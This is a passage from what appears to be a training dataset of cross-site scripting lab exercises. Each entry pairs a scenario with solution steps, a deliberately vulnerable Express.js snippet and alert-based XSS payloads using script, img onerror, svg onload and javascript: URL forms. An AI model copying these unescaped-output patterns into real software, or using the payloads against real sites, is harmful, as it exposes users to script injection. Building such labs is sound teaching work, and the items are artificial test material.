    "Lab scenario": "Reflected XSS in movie ticket booking reference field",
    "Lab Description": "Booking reference is echoed back in the final confirmation page unsanitized.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Book with reference <script>alert('MovieXSS')</script>.",
      "Observe XSS on result page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/confirm-booking', (req, res) => {\n  const ref = req.body.ref;\n  res.send(`<p>Your reference: ${ref}</p>`);\n});",
    "payloads": [
      "<script>alert('MovieXSS')</script>",
      "<svg/onload=alert('Ref')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in contact message field",
    "Lab Description": "A contact form stores submitted messages without sanitization and displays them to admins. An attacker can inject persistent JavaScript.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit message with <script>alert('ContactXSS')</script>.",
      "Login as admin and open messages view.",
      "Observe JavaScript execution in admin panel."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/send-message', (req, res) => {\n  const msg = req.body.message;\n  db.query(\"INSERT INTO messages (content) VALUES (?)\", [msg]);\n  res.send('Message sent');\n});",
    "payloads": [
      "<script>alert('ContactXSS')</script>",
      "<img src=x onerror=alert('MsgXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in job application cover letter",
    "Lab Description": "A job portal saves user-submitted cover letters without escaping and displays them to HR staff.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit application with <script>alert('HRXSS')</script> in cover letter.",
      "Login as HR and view the application.",
      "Confirm XSS execution in HR panel."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/apply-job', (req, res) => {\n  const cover = req.body.cover;\n  db.query(\"INSERT INTO applications (cover_letter) VALUES (?)\", [cover]);\n  res.send('Application submitted');\n});",
    "payloads": [
      "<script>alert('HRXSS')</script>",
      "<img src=x onerror=alert('CoverXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in personal finance note field",
    "Lab Description": "Users can add personal notes to transactions. These notes are rendered without filtering, leading to XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit note with <script>alert('FinanceXSS')</script>.",
      "Open transaction history and confirm execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO notes (text) VALUES (?)\", [note]);\n  res.send('Note saved');\n});",
    "payloads": [
      "<script>alert('FinanceXSS')</script>",
      "<img src=x onerror=alert('NoteXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in referral system input",
    "Lab Description": "Referral codes submitted in a form are reflected in the result page without escaping, allowing reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit referral code: <script>alert('ReferralXSS')</script>.",
      "Observe code execution on thank you page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/refer', (req, res) => {\n  const code = req.body.code;\n  res.send(`<h3>Thanks for using code: ${code}</h3>`);\n});",
    "payloads": [
      "<script>alert('ReferralXSS')</script>",
      "<svg/onload=alert('Referral')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in restaurant review comment",
    "Lab Description": "Restaurant reviews allow comments that are stored and displayed without proper filtering.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit comment <script>alert('FoodXSS')</script>.",
      "Reload the restaurant page to trigger execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO comments (text) VALUES (?)\", [comment]);\n  res.send('Comment added');\n});",
    "payloads": [
      "<script>alert('FoodXSS')</script>",
      "<img src=x onerror=alert('Comment')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in insurance claim description",
    "Lab Description": "Insurance claim descriptions are displayed to agents with no escaping. Attackers can inject persistent scripts.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a claim with <script>alert('ClaimXSS')</script>.",
      "Login as insurance agent and review claim.",
      "Observe script execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-claim', (req, res) => {\n  const desc = req.body.description;\n  db.query(\"INSERT INTO claims (description) VALUES (?)\", [desc]);\n  res.send('Claim submitted');\n});",
    "payloads": [
      "<script>alert('ClaimXSS')</script>",
      "<img src=x onerror=alert('Claim')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in newsletter signup name field",
    "Lab Description": "Newsletter signup form reflects the name in the thank-you message without escaping.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Signup using <script>alert('NewsletterXSS')</script> as your name.",
      "Observe the reflected XSS in confirmation."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/subscribe', (req, res) => {\n  const name = req.body.name;\n  res.send(`<p>Thanks ${name} for subscribing!</p>`);\n});",
    "payloads": [
      "<script>alert('NewsletterXSS')</script>",
      "<img src=x onerror=alert('SubXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in student report comment section",
    "Lab Description": "Teachers leave comments on student reports. These comments are stored and rendered without filtering.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a report comment: <script>alert('ReportXSS')</script>.",
      "Login as admin and view the comment section.",
      "Observe script execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/comment-report', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO report_comments (text) VALUES (?)\", [comment]);\n  res.send('Comment submitted');\n});",
    "payloads": [
      "<script>alert('ReportXSS')</script>",
      "<img src=x onerror=alert('Report')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in project collaboration note",
    "Lab Description": "Project collaboration tool allows team members to leave notes. Notes are rendered directly without sanitization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add note with <script>alert('ProjectXSS')</script>.",
      "Open project dashboard and confirm execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO project_notes (text) VALUES (?)\", [note]);\n  res.send('Note added');\n});",
    "payloads": [
      "<script>alert('ProjectXSS')</script>",
      "<img src=x onerror=alert('NoteXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in travel site trip review",
    "Lab Description": "Users review trips and the reviews are displayed without escaping, allowing stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a trip review with <script>alert('TravelXSS')</script>.",
      "Reload the trip page to trigger the payload."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-review', (req, res) => {\n  const review = req.body.review;\n  db.query(\"INSERT INTO travel_reviews (content) VALUES (?)\", [review]);\n  res.send('Review submitted');\n});",
    "payloads": [
      "<script>alert('TravelXSS')</script>",
      "<img src=x onerror=alert('Trip')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in e-ticketing system message field",
    "Lab Description": "The e-ticketing portal allows users to send messages to support. The messages are stored and displayed to staff without sanitization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a ticket with <script>alert('TicketXSS')</script> in message.",
      "Login as support staff and view the ticket.",
      "Observe script execution on ticket detail page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-ticket', (req, res) => {\n  const msg = req.body.message;\n  db.query(\"INSERT INTO tickets (message) VALUES (?)\", [msg]);\n  res.send('Ticket submitted');\n});",
    "payloads": [
      "<script>alert('TicketXSS')</script>",
      "<img src=x onerror=alert('Ticket')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in internal employee feedback form",
    "Lab Description": "The HR system allows employees to give anonymous feedback. Input is rendered without sanitization in the dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit feedback: <script>alert('Feedback')</script>.",
      "Login as HR and open dashboard.",
      "Observe payload executing in browser."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  db.query(\"INSERT INTO employee_feedback (text) VALUES (?)\", [feedback]);\n  res.send('Feedback recorded');\n});",
    "payloads": [
      "<script>alert('Feedback')</script>",
      "<svg onload=alert('HR')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in healthcare system symptoms notes",
    "Lab Description": "Patients submit symptom notes, which are viewed by doctors. Input is saved and reflected without filtering.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Login as patient and submit: <script>alert('DoctorXSS')</script> in symptoms.",
      "Login as doctor and read notes.",
      "Observe XSS execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-symptoms', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO symptoms (note) VALUES (?)\", [note]);\n  res.send('Submitted');\n});",
    "payloads": [
      "<script>alert('DoctorXSS')</script>",
      "<img src=x onerror=alert('HealthXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in booking confirmation notes",
    "Lab Description": "Users can leave additional notes during booking. These notes are stored and rendered without sanitization on admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit booking with <script>alert('BookingXSS')</script> as note.",
      "Login as admin and view bookings.",
      "Observe script running."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/book', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO bookings (note) VALUES (?)\", [note]);\n  res.send('Booking confirmed');\n});",
    "payloads": [
      "<script>alert('BookingXSS')</script>",
      "<img src=x onerror=alert('BookNote')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in bug report reproduction steps",
    "Lab Description": "Bug tracker stores user-submitted reproduction steps. The steps are rendered for developers without filtering.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit bug with <script>alert('BugXSS')</script> in steps.",
      "Login as developer and open report.",
      "Observe payload execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/report-bug', (req, res) => {\n  const steps = req.body.steps;\n  db.query(\"INSERT INTO bug_reports (steps) VALUES (?)\", [steps]);\n  res.send('Bug submitted');\n});",
    "payloads": [
      "<script>alert('BugXSS')</script>",
      "<svg/onload=alert('StepsXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in mobile recharge confirmation screen",
    "Lab Description": "Recharge form reflects submitted phone number in the confirmation view without sanitization.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit phone number: <script>alert('Recharge')</script>.",
      "Observe execution in confirmation."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/recharge', (req, res) => {\n  const number = req.body.phone;\n  res.send(`<h3>Recharged: ${number}</h3>`);\n});",
    "payloads": [
      "<script>alert('Recharge')</script>",
      "<svg onload=alert('PhoneXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in user suggestions submission field",
    "Lab Description": "Public suggestion box accepts suggestions that are rendered for moderators without sanitization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit: <script>alert('Suggestion')</script> as a suggestion.",
      "Login as moderator and read suggestions.",
      "Confirm XSS payload execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-suggestion', (req, res) => {\n  const suggestion = req.body.suggestion;\n  db.query(\"INSERT INTO suggestions (text) VALUES (?)\", [suggestion]);\n  res.send('Thank you');\n});",
    "payloads": [
      "<script>alert('Suggestion')</script>",
      "<img src=x onerror=alert('XSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in forum private message feature",
    "Lab Description": "Private messages are displayed in inbox without escaping, allowing stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send PM with <script>alert('PM')</script>.",
      "Login as recipient and open inbox.",
      "Observe alert triggered."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/send-message', (req, res) => {\n  const content = req.body.message;\n  db.query(\"INSERT INTO messages (content) VALUES (?)\", [content]);\n  res.send('Message sent');\n});",
    "payloads": [
      "<script>alert('PM')</script>",
      "<svg onload=alert('InboxXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in community voting comments",
    "Lab Description": "Users can comment on votes. Comments are rendered without sanitization in the result page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add comment: <script>alert('VoteXSS')</script>.",
      "Visit vote results page.",
      "Observe alert execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/comment-vote', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO vote_comments (text) VALUES (?)\", [comment]);\n  res.send('Comment submitted');\n});",
    "payloads": [
      "<script>alert('VoteXSS')</script>",
      "<img src=x onerror=alert('VoteComment')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in event registration custom message",
    "Lab Description": "Users can leave custom messages when registering for an event. These are rendered without escaping in admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Register for event with <script>alert('Event')</script> as message.",
      "Admin views the registration list.",
      "Observe XSS payload triggering."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/register-event', (req, res) => {\n  const msg = req.body.message;\n  db.query(\"INSERT INTO registrations (message) VALUES (?)\", [msg]);\n  res.send('Registered');\n});",
    "payloads": [
      "<script>alert('Event')</script>",
      "<svg/onload=alert('EventXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in job application cover letter",
    "Lab Description": "Job applicants can submit a cover letter. The input is stored and displayed to recruiters without sanitization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit application with <script>alert('CoverXSS')</script> in the cover letter.",
      "Login as recruiter and view application.",
      "Observe alert triggered on load."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/apply-job', (req, res) => {\n  const cover = req.body.cover;\n  db.query(\"INSERT INTO applications (cover_letter) VALUES (?)\", [cover]);\n  res.send('Application submitted');\n});",
    "payloads": [
      "<script>alert('CoverXSS')</script>",
      "<img src=x onerror=alert('Cover')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in newsletter subscription notes",
    "Lab Description": "The newsletter form includes an optional note field. Notes are displayed to admins without escaping.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Subscribe with note <script>alert('NoteXSS')</script>.",
      "Login as admin and view subscriptions.",
      "Observe script execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/subscribe', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO subscribers (note) VALUES (?)\", [note]);\n  res.send('Subscribed');\n});",
    "payloads": [
      "<script>alert('NoteXSS')</script>",
      "<svg onload=alert('Note')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in feature request title",
    "Lab Description": "Users submit feature requests. The title is stored and displayed without sanitization on admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit: <script>alert('Feature')</script> as title.",
      "Login as admin and open requests list.",
      "Observe XSS payload triggered."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/request-feature', (req, res) => {\n  const title = req.body.title;\n  db.query(\"INSERT INTO features (title) VALUES (?)\", [title]);\n  res.send('Request submitted');\n});",
    "payloads": [
      "<script>alert('Feature')</script>",
      "<img src=x onerror=alert('FeatureXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in ride-sharing app driver feedback",
    "Lab Description": "Passengers leave feedback for drivers. Input is stored and rendered without escaping on driver dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit feedback with <script>alert('Driver')</script>.",
      "Login as driver and view feedback.",
      "Observe alert triggered."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  db.query(\"INSERT INTO driver_feedback (text) VALUES (?)\", [feedback]);\n  res.send('Thanks');\n});",
    "payloads": [
      "<script>alert('Driver')</script>",
      "<svg/onload=alert('RideXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in bug bounty program POC URL",
    "Lab Description": "Bug reporters submit a POC URL. It's rendered without escaping in admin reports dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit POC URL as: javascript:alert('Bug')",
      "Login as admin and view report list.",
      "Observe JS execution via malformed link."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-bug', (req, res) => {\n  const url = req.body.poc;\n  db.query(\"INSERT INTO bugs (url) VALUES (?)\", [url]);\n  res.send('Report received');\n});",
    "payloads": [
      "<a href='javascript:alert(`POC`)'>POC</a>",
      "<iframe src='javascript:alert(1)'></iframe>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in travel booking special instructions",
    "Lab Description": "Users leave special instructions during travel booking. Input is rendered without sanitization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Book trip with <script>alert('Travel')</script>.",
      "Admin views booking.",
      "Observe execution of injected script."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/travel-booking', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO travel_notes (note) VALUES (?)\", [note]);\n  res.send('Trip booked');\n});",
    "payloads": [
      "<script>alert('Travel')</script>",
      "<img src=x onerror=alert('Trip')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in auction platform product question",
    "Lab Description": "Buyers can ask public questions. The input is not sanitized before display.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Ask question: <script>alert('Auction')</script>.",
      "Seller views Q&A tab.",
      "Confirm payload executes."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/ask-question', (req, res) => {\n  const q = req.body.question;\n  db.query(\"INSERT INTO questions (text) VALUES (?)\", [q]);\n  res.send('Submitted');\n});",
    "payloads": [
      "<script>alert('Auction')</script>",
      "<svg/onload=alert('QnAXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in bank contact form message field",
    "Lab Description": "Bank contact form messages are shown to operators without any escaping.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit message: <script>alert('Bank')</script>.",
      "Login as operator and view inbox.",
      "Script runs on page load."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/contact-bank', (req, res) => {\n  const msg = req.body.message;\n  db.query(\"INSERT INTO contact_messages (text) VALUES (?)\", [msg]);\n  res.send('Message sent');\n});",
    "payloads": [
      "<script>alert('Bank')</script>",
      "<img src=x onerror=alert('BankXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in quiz app answer explanation field",
    "Lab Description": "Instructors submit explanation text that is reflected unescaped in quiz preview.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit explanation with <script>alert('Quiz')</script>.",
      "Preview question and confirm execution.",
      "Test different payload formats."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-explanation', (req, res) => {\n  const text = req.body.explanation;\n  db.query(\"INSERT INTO explanations (text) VALUES (?)\", [text]);\n  res.send('Saved');\n});",
    "payloads": [
      "<script>alert('Quiz')</script>",
      "<svg onload=alert('XSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in bug tracking system tag field",
    "Lab Description": "Bugs can be tagged. Tags are reflected on pages without encoding.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit tag as <script>alert('Tag')</script>.",
      "View bug page.",
      "Observe execution of XSS."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-tag', (req, res) => {\n  const tag = req.body.tag;\n  db.query(\"INSERT INTO bug_tags (tag) VALUES (?)\", [tag]);\n  res.send('Tag added');\n});",
    "payloads": [
      "<script>alert('Tag')</script>",
      "<img src=x onerror=alert('BugTag')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in user-submitted tutorial title",
    "Lab Description": "Users submit tutorials with titles that are rendered in the dashboard without sanitization. A malicious title can trigger script execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a tutorial with <script>alert('Tutorial')</script> as the title.",
      "Login as admin and open the tutorial dashboard.",
      "Observe script execution on load."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-tutorial', (req, res) => {\n  const title = req.body.title;\n  db.query(\"INSERT INTO tutorials (title) VALUES (?)\", [title]);\n  res.send('Tutorial submitted');\n});",
    "payloads": [
      "<script>alert('Tutorial')</script>",
      "<img src=x onerror=alert('XSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in payment comment field",
    "Lab Description": "During payment, users can add comments. These are stored and shown in the transaction history with no escaping.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Make a payment with <script>alert('Payment')</script> as comment.",
      "Open transaction history.",
      "Observe XSS execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/pay', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO transactions (comment) VALUES (?)\", [comment]);\n  res.send('Payment successful');\n});",
    "payloads": [
      "<script>alert('Payment')</script>",
      "<svg/onload=alert('PayXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in e-learning discussion reply",
    "Lab Description": "Students reply to threads. Replies are stored and rendered on the thread page with no sanitization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit reply: <script>alert('ReplyXSS')</script>.",
      "Reload thread page.",
      "Observe execution of the payload."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/post-reply', (req, res) => {\n  const reply = req.body.reply;\n  db.query(\"INSERT INTO replies (text) VALUES (?)\", [reply]);\n  res.send('Reply posted');\n});",
    "payloads": [
      "<script>alert('ReplyXSS')</script>",
      "<img src=x onerror=alert('Reply')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in donation platform donor message",
    "Lab Description": "Donors can leave a message. These are rendered without escaping in the public donation wall.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Donate with <script>alert('Donate')</script> as the message.",
      "View donation wall.",
      "Confirm payload executes."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/donate', (req, res) => {\n  const msg = req.body.message;\n  db.query(\"INSERT INTO donations (message) VALUES (?)\", [msg]);\n  res.send('Thank you');\n});",
    "payloads": [
      "<script>alert('Donate')</script>",
      "<svg/onload=alert('Wall')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in restaurant order notes",
    "Lab Description": "Food ordering system allows custom notes per order. These are rendered to staff dashboards unsanitized.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Place order with <script>alert('Order')</script> in notes.",
      "Login as restaurant staff.",
      "Observe alert triggered on viewing order."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/order', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO orders (note) VALUES (?)\", [note]);\n  res.send('Order placed');\n});",
    "payloads": [
      "<script>alert('Order')</script>",
      "<img src=x onerror=alert('Food')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in lost & found item description",
    "Lab Description": "Users post found items with a description. The content is displayed without escaping.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Post item with <script>alert('Lost')</script>.",
      "Go to listing page and observe execution.",
      "Confirm persistence."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/found-item', (req, res) => {\n  const desc = req.body.description;\n  db.query(\"INSERT INTO items (description) VALUES (?)\", [desc]);\n  res.send('Item listed');\n});",
    "payloads": [
      "<script>alert('Lost')</script>",
      "<svg onload=alert('Found')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in product inquiry form",
    "Lab Description": "Visitors can ask questions about products. The input is stored and shown on product pages without escaping.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Ask question: <script>alert('Product')</script>.",
      "View product page and trigger payload.",
      "Try encoded variations too."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/product-question', (req, res) => {\n  const question = req.body.question;\n  db.query(\"INSERT INTO inquiries (question) VALUES (?)\", [question]);\n  res.send('Question sent');\n});",
    "payloads": [
      "<script>alert('Product')</script>",
      "<img src=x onerror=alert('Inquiry')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in calendar event title",
    "Lab Description": "A calendar app allows event titles to be stored and displayed in daily views. No sanitization is applied.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create event with title <script>alert('Calendar')</script>.",
      "View day view calendar.",
      "Observe alert triggered."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-event', (req, res) => {\n  const title = req.body.title;\n  db.query(\"INSERT INTO events (title) VALUES (?)\", [title]);\n  res.send('Event created');\n});",
    "payloads": [
      "<script>alert('Calendar')</script>",
      "<img src=x onerror=alert('DayView')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online petition reason field",
    "Lab Description": "Petitioners submit a reason, which is rendered in supporter feeds unsanitized.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Sign petition with reason <script>alert('Petition')</script>.",
      "View recent supporters.",
      "Observe payload triggering."
    ],
